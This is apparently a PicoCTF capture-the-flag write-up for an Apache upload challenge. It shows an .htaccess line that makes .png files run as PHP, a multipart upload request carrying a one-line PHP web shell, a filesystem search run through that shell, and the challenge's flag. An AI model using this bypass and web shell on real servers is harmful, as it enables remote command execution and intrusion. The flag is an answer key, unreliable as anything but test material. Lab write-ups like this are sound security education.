#upload #phpupload #htacess #bypassupload


#### Challenge Description 



![](../../PicoCTF-assets/Pasted%20image%2020260301124634.png)


Because it is apache so I did some research and I found this particular website : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/README.md

This particularly caught my eye in the website : Upload an .htaccess with : `AddType application/x-httpd-php .png` Then upload any file with `.png` extension.

Explanation :

"Basically, I'm telling the server: 'Forget the extension; if it’s a .png file, execute it as PHP code instead of serving it as a static image'."


![](../../PicoCTF-assets/Pasted%20image%2020260301124832.png)

```
AddType application/x-httpd-php .png
```

This allows me to force the system to execute a 'fake' image as a PHP script.

Then let's modify the request in Burpsuite to run any command in the system.

```
------geckoformboundary1f2c2735b7ef17d5cc90171b1da6cbc
Content-Disposition: form-data; name="image"; filename="image.php.png"
Content-Type: application/x-php

<?php system($_GET['c']); ?>

------geckoformboundary1f2c2735b7ef17d5cc90171b1da6cbc--
```


![](../../PicoCTF-assets/Pasted%20image%2020260301124417.png)

This code creates a **web backdoor** that captures whatever text you type after `?c=` in the URL and passes it directly to the server's operating system to be executed as a local command.


So let's try it in action : 

![](../../PicoCTF-assets/Pasted%20image%2020260301124350.png)


Now we want to find the flag so : 

```
?c=find / -name "*flag*" 2>/dev/null
```

![](../../PicoCTF-assets/Pasted%20image%2020260301124324.png)


We found it now open /var/www/flag.txt


![](../../PicoCTF-assets/Pasted%20image%2020260301124226.png)


Flag : picoCTF{s3rv3r_byp4ss_65a9e718}